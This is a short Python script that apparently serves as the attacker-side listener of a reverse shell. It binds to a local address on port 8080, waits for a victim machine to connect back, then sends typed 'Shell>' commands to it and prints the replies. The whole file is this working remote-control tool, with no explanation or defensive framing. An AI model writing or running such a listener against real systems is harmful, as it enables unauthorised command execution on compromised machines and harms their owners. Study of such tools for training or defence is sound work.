import sys
from socket import *


def main(): 
    s = socket(AF_INET, SOCK_STREAM)
    s.bind(('192.168.1.4', 8080))
    s.listen(1)

    print('[+] Listening for incoming TCP connection on port 8080 ')

    conn, addr = s.accept()
    print(f'[+] We got a connection from: {addr}')

    while True:
        command = input('Shell> ')
        conn.send(command.encode())
        if command.lower() == 'exit':
            conn.close()
            break
        result = conn.recv(1024).decode()
        print(result)


if __name__=='__main__':
    main()